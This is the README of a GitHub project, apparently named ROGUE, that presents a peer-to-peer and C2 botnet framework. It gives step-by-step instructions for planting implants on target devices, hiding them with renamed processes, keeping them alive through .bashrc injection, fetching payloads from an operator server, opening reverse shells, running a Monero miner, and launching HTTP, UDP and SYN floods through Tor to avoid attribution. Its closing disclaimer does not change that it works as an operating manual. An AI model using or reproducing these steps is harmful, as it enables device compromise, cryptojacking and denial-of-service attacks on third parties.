# r0gue

ROGUE is a manually-deployed peer-to-peer and command-and-control (C2) botnet framework built for secure multi-device orchestration. It supports encrypted communication using AES, with optional peer-to-peer fallback if the primary C2 is unreachable.  
ROGUE supports implants on Linux laptops, Raspberry Pi, Termux (Android), and iOS environments.

---

## Installation

To clone ROGUE from your Kali system, run:

```bash
git clone https://github.com/ekomsSavior/rogue.git
cd rogue
```

Install dependencies manually:

```bash
sudo apt update
sudo apt install python3 
sudo apt install  python3-pycryptodome  
```

---

## File Structure

- `rogue_c2.py` – Encrypted command-and-control server
- `rogue_implant.py` – Bot implant for manual deployment with trigger handling, payload loader, and stealth logic
- `payloads/` – Folder containing executable modules such as:
  - `mine.py`: Real CPU-based cryptocurrency miner with pool config and resource control
  - `ddos.py`: Threaded DDoS engine supporting HTTP, TCP SYN, and UDP floods

---

## Usage

### Start the C2 Server

On your Kali controller machine:

```bash
python3 rogue_c2.py
```

### Deploy a Bot Implant

1. Copy `rogue_implant.py` to the target device.
2. Edit the `C2_HOST` and `PAYLOAD_REPO` variable in the script to match your controller’s IP.
3. Run the implant:

```bash
python3 rogue_implant.py
```

The implant will:
- Connect to the C2 server using AES-encrypted commands
- Attempt peer-to-peer fallback discovery if the C2 is unreachable
- Stealth itself using renamed process titles and hidden payload storage
- Persist by injecting itself into the target’s `.bashrc`

### Host Payloads

To serve payloads for bots to fetch:

```bash
cd payloads/
python3 -m http.server 8000
```
## Command Syntax

Once bots are connected to the C2, you can interact with them using the terminal interface.

You can issue commands to all bots at once, or use the `target <index>` syntax to control a specific bot.

### Core Commands:

```text
load_payload mine.py
```
Instructs the bot to download `mine.py` from your HTTP payload server.

```text
run_payload mine.py
```
Executes the downloaded `mine.py` miner on the bot.

```text
reverse_shell
```
Opens a reverse shell session from the bot to your C2.  
You must be listening on port `9001` with:

```bash
nc -lvnp 9001
```

### Triggered Payload Commands:

```text
trigger_mine
```
Tells all bots to run `mine.py` without needing to manually load it.  
Implants must have previously fetched this payload or auto-load it on trigger.

```text
trigger_ddos
```
Tells all bots to launch the `ddos.py` module.

You can also manually specify the DDoS target like so:

```text
run_payload ddos.py trigger_ddos <target_ip> <port> <duration> <threads> <mode>
```

#### Example:

```text
run_payload ddos.py trigger_ddos 192.168.0.99 80 60 150 http
```

This launches an HTTP flood attack on `192.168.0.99:80` for 60 seconds using 150 threads.

### DDoS Modes Available:

| Mode  | Description                            |
|-------|----------------------------------------|
| http  | HTTP GET flood with rotating headers   |
| udp   | Raw UDP packet spam                    |
| tcp   | TCP SYN flood                          |

> Note: Ensure `ddos.py` and `mine.py` are hosted and visible to the bots via your payload server (typically served on port `8000`).

---

Need to test payload access?

From the bot:

```bash
curl http://<C2_IP>:8000/mine.py
```

If the file downloads, the bot should be able to fetch it successfully.


Tor Support (Optional)

Built into ddos.py, you can enable routing DDoS traffic through Tor SOCKS5 by setting: 

```bash
USE_TOR = True
```
This uses PySocks to route all flood traffic through 127.0.0.1:9050, the default local Tor proxy.

Install Tor + PySocks:

```bash
sudo apt install tor
pip3 install pysocks
```

Then start Tor:

```bash
sudo systemctl start tor@default
```

And run the DDoS module as usual:

```bash
python3 ddos.py trigger_ddos <target> <port> <duration> <threads> <mode>
```
---

## Maintaining Bots

- ROGUE implants require Python3 and internet/network access
- Ensure `rogue_c2.py` is running to accept bot connections
- Keep your `payloads/` server online and accessible
- Update your payloads regularly for improved capabilities or evasion

---

## Payload Details

### `mine.py`

- Real CPU-based Monero miner
- Supports pool config, wallet input, and resource throttling
- Threaded hashing with runtime duration control
- Cakewallet supports xmr MONERO. edit your mine.py with your XMR MONERO address
  https://cakewallet.com/

### `ddos.py`

- Supports multiple attack modes:
  - HTTP GET flood with user-agent rotation
  - UDP flood to arbitrary ports
  - TCP SYN flood
- CLI-style arguments allow flexible targeting from C2
- Tor Benefits in DDoS Mode
  - IP obfuscation via exit nodes
  - Makes attribution and detection harder during stress testing
  - Compatible with all http, tcp, and udp flood types

---

## Disclaimer

Do not deploy ROGUE on any device, network, or system you do not own or have explicit permission to operate on. Unauthorized use of this software may violate laws. This framework is provided for educational and ethical research purposes only. The developers assume no liability and provide this software without warranty or support.
